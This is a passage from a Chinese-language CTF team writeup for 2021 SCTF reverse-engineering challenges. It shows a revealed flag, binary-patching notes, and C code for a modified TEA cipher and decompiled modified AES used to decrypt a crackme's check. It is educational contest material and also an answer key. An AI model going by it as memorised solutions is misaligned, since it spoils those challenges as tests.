class="number">1</span>:]))</span><br><span class="line">$ ./dance.out </span><br><span class="line"></span><br><span class="line"><span class="symbol">Input</span>:waltznymphforquickjigsvexbud</span><br><span class="line"></span><br><span class="line"><span class="symbol">Good</span> for you!</span><br><span class="line"></span><br><span class="line">flag:<span class="symbol">SCTF</span>&#123;waltznymphforquickjigsvexbud&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="cplusexceptionencrypt"><strong>CplusExceptionEncrypt</strong></span><a href="#cplusexceptionencrypt" class="header-anchor"></a></h3><p>描述：cpp is a good language</p>
<p>使用ssh穿起来的逻辑，可以这样将他处理</p>
<p><img src="../images/2021-12-25-SCTF/20211228082942213.jpg" alt="img"></p>
<p><img src="../images/2021-12-25-SCTF/20211228082942283.jpg" alt="img"></p>
<p>计算 0x402c37-0x402730&#x3D;0x507</p>
<p>然后把throw改成 jmp 0x572</p>
<p>jmp 0x502</p>
<p>就行了</p>
<p>可能还要简单根据结构体确认一下跳转</p>
<p>分析了一下大部分的操作都用seh框起来，目测是xxtea</p>
<p>魔改的tea+稍微正常的aes（也魔改了）</p>
<p>tea部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;  </span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], v2=v[<span class="number">2</span>], v3=v[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> sum1=<span class="number">0</span>,sum2=<span class="number">0</span>, i;           <span class="comment">/* set up */</span>  </span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">0x73637466</span>;                     <span class="comment">/* a key schedule constant */</span>  </span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span>  </span><br><span class="line"></span><br><span class="line">        sum1 += delta;  </span><br><span class="line"></span><br><span class="line">        sum2 += delta;  </span><br><span class="line"></span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k2) ^ (sum1 + v1) ^ ((v1&gt;&gt;<span class="number">5</span>) + k3) ^ (sum1 + i);  </span><br><span class="line"></span><br><span class="line">        v2 += ((v3&lt;&lt;<span class="number">4</span>) + k2) ^ (sum2 + v3) ^ ((v3&gt;&gt;<span class="number">5</span>) + k3) ^ (sum2 + i);  </span><br><span class="line"></span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k0) ^ (sum1 + v0) ^ ((v0&gt;&gt;<span class="number">5</span>) + k1) ^ (sum1 + i);  </span><br><span class="line"></span><br><span class="line">        v3 += ((v2&lt;&lt;<span class="number">4</span>) + k0) ^ (sum2 + v2) ^ ((v2&gt;&gt;<span class="number">5</span>) + k1) ^ (sum2 + i);  </span><br><span class="line"></span><br><span class="line">        <span class="comment">// v1 += ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);  </span></span><br><span class="line"></span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>]=v0 ^ ((delta&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>); v[<span class="number">1</span>]=v1^ ((delta&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>);  </span><br><span class="line"></span><br><span class="line">    v[<span class="number">2</span>]=v2^ ((delta&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>); v[<span class="number">3</span>]=v3 ^ ((delta)&amp;<span class="number">0xff</span>);  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//解密函数  </span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span> <span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> &#123;  </span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], v2=v[<span class="number">2</span>], v3=v[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> sum1=<span class="number">0x6c6e8cc0</span>,sum2=<span class="number">0x6c6e8cc0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;  <span class="comment">/* set up */</span>  </span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta=<span class="number">0x73637466</span>;                     <span class="comment">/* a key schedule constant */</span>  </span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span>  </span><br><span class="line"></span><br><span class="line">    v0=v0 ^ ((delta&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>); v1=v1^ ((delta&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>);  </span><br><span class="line"></span><br><span class="line">    v2=v2^ ((delta&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>); v3=v3 ^ ((delta)&amp;<span class="number">0xff</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">31</span>; i&gt;=<span class="number">0</span>; i--) &#123;                         <span class="comment">/* basic cycle start */</span>  </span><br><span class="line"></span><br><span class="line">        v3 -= ((v2&lt;&lt;<span class="number">4</span>) + k0) ^ (sum2 + v2) ^ ((v2&gt;&gt;<span class="number">5</span>) + k1) ^ (sum2 + i);  </span><br><span class="line"></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k0) ^ (sum1 + v0) ^ ((v0&gt;&gt;<span class="number">5</span>) + k1) ^ (sum1 + i);  </span><br><span class="line"></span><br><span class="line">        v2 -= ((v3&lt;&lt;<span class="number">4</span>) + k2) ^ (sum2 + v3) ^ ((v3&gt;&gt;<span class="number">5</span>) + k3) ^ (sum2 + i);  </span><br><span class="line"></span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k2) ^ (sum1 + v1) ^ ((v1&gt;&gt;<span class="number">5</span>) + k3) ^ (sum1 + i);  </span><br><span class="line"></span><br><span class="line">        sum1 -= delta;  </span><br><span class="line"></span><br><span class="line">        sum2 -= delta;  </span><br><span class="line"></span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span>  </span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;  </span><br><span class="line"></span><br><span class="line">    v[<span class="number">2</span>]=v2; v[<span class="number">3</span>]=v3;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>AES魔改部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">oid __cdecl <span class="title function_">enc_next</span><span class="params">(<span class="type">uint8_t</span> *roundkeys, <span class="type">uint8_t</span> *plaintext, <span class="type">uint8_t</span> *ciphertext)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  _DWORD *v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _DWORD *v4; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">type_info</span> *<span class="title">v5</span>;</span> <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span> *v7; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span> *v8; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *v9; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *v10; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span> *v11; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::__cxx11::<span class="built_in">string</span> temp_2; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span> tmp[<span class="number">16</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [rsp+5Eh] [rbp-22h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span> t; <span class="comment">// [rsp+5Fh] [rbp-21h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">double</span> temp_1; <span class="comment">// [rsp+60h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> temp_0; <span class="comment">// [rsp+6Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> temp; <span class="comment">// [rsp+73h] [rbp-Dh]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> a; <span class="comment">// [rsp+74h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> cnt; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span> j; <span class="comment">// [rsp+7Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span> i; <span class="comment">// [rsp+7Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  v3 = _cxa_allocate_exception(<span class="number">4u</span>i64);</span><br><span class="line"></span><br><span class="line">  *v3 = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( refptr__ZTIi != (<span class="keyword">struct</span> type_info *<span class="type">const</span>)<span class="number">1</span> )</span><br><span class="line"></span><br><span class="line">    Unwind_Resume(v3);</span><br><span class="line"></span><br><span class="line">  a = *(_DWORD *)_cxa_begin_catch(v3);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFu</span>; ++i )</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    v8 = roundkeys++;</span><br><span class="line"></span><br><span class="line">    ciphertext[i] = *v8 ^ plaintext[i] ^ <span class="number">0x66</span>; <span class="comment">// 多了一个^0x66</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _cxa_end_catch();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 后面逻辑大致整理</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">CipherSCTF</span><span class="params">(<span class="type">state_t</span>* state, <span class="type">const</span> <span class="type">uint8_t</span>* RoundKey)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span> round = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add the First round key to the state before starting the rounds.</span></span><br><span class="line"></span><br><span class="line">  AddRoundKeyDec(<span class="number">0</span>, state, RoundKey); <span class="comment">// ciphertext[i] = *v8 ^ plaintext[i] ^ 0x66; // 多了一个^0x66</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// There will be Nr rounds.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// The first Nr-1 rounds are identical.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// These Nr rounds are executed in the loop below.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Last one without InvMixColumn()</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (round = <span class="number">1</span>; ; ++round)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    InvShiftRows(state);</span><br><span class="line"></span><br><span class="line">    InvSubBytes(state);</span><br><span class="line"></span><br><span class="line">    MixColumns(state);</span><br><span class="line"></span><br><span class="line">    AddRoundKey(round, state, RoundKey);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (round == Nr) &#123;</span><br><span class="line"></span><br><span class="line">      SubBytes(state);</span><br><span class="line"></span><br><span class="line">      ShiftRows(state);</span><br><span class="line"></span><br><span class="line">      AddRoundKey(round, state, RoundKey);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加密流程：</p>
<p> - 输入32个字符</p>
<ul>
<li>TEA处理前16个</li>
<li>AES处理前16个</li>
<li>TEA处理后16个</li>
<li>AES处理后16个</li>
<li>比较</li>
</ul>
<p>根据上述描述写出解密即可</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>2021 SCTF SU Writeup</p><p><a href="https://team-su.github.io/posts/65490.html">https://team-su.github.io/posts/65490.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2021-12-28</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-07-13</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/SCTF/">SCTF</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/24249.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2022 RWCTF体验赛 SU Writeup</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/14709.html"><span class="level-item">2021 RCTF Harmony Writeup</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><!--!--></body></html>